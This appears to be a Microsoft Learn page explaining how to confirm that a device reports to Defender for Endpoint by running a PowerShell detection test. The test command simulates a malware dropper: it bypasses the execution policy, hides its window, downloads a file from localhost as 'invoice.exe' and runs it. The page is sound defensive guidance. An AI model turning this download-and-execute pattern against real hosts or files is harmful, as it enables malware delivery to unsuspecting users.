<!-- Source: https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test -->
<!-- Sitemap-Last-Modified: 2026-07-29 -->

# Run a detection test on a device recently onboarded to Microsoft Defender for Endpoint

When you add a device to the Microsoft Defender for Endpoint service for management, it's referred to as onboarding. Onboarding allows devices to report signals about their health status to Microsoft Defender for Endpoint.

Verifying that a device is added to the service successfully is a critical step in the entire deployment process. It helps ensure that all the devices expected are being managed.

This article explains how to run a PowerShell detection test on a recently onboarded device to confirm that it's properly reporting to the Defender for Endpoint service.

## Prerequisites

### Supported operating systems

The following operating systems are supported for the onboarding verification detection test:

- Windows Server 2012 R2
- Windows Server 2016 and later
- Azure Stack HCI OS, version 23H2 and later

## Verify Microsoft Defender for Endpoint onboarding of a device using a PowerShell detection test

Run the following PowerShell script on a newly onboarded device to verify that the device is properly reporting to the Defender for Endpoint service.

1. On the device, open Command Prompt as an administrator.
2. At the prompt, copy and run the following command. This command simulates a malicious download-and-execute pattern so that Microsoft Defender for Endpoint can detect it and confirm that the device is reporting correctly:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```


   The Command Prompt window closes automatically. If the script runs successfully, a new alert appears in the Microsoft Defender portal for the onboarded device in about 10 minutes.


   Note


   You can also [Configure extension file exclusions for Microsoft Defender Antivirus](https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-exclusions-configure) to perform this test. You'll receive a notification on the endpoint and an alert in the Microsoft Defender portal.

## Related articles

- [Onboard client devices to Microsoft Defender for Endpoint](https://learn.microsoft.com/en-us/defender-endpoint/onboard-client)
- [Onboard servers to Microsoft Defender for Endpoint](https://learn.microsoft.com/en-us/defender-endpoint/onboard-server)
- [Troubleshoot Microsoft Defender for Endpoint onboarding issues](https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-onboarding)
